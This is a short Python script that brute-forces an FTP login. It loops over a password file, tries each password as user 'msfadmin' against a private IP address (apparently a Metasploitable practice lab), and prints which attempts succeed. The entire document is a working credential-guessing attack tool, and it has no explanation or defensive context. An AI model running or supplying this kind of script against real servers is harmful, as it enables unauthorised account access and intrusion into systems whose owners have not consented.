#!/usr/bin/python3
import ftplib


def ftp_connect(hostname, username, password):
    try:
        client = ftplib.FTP(hostname)
        client.login(username, password)
        print(f'[+] {hostname}: {username}@{password}')
        return client
    except Exception:
        print(f'[-] {hostname}: {username}@{password}')
        return None


def ftp_close(client):
    client.quit()


def main():
    host = '192.168.100.97'
    user = 'msfadmin'
    with open('passwords.txt', 'r') as f:
        for password in f.readlines():
            child = ftp_connect(host, user, password.strip('\n'))
            if child:
                ftp_close(child)
        f.close()


if __name__ == '__main__':
    main()
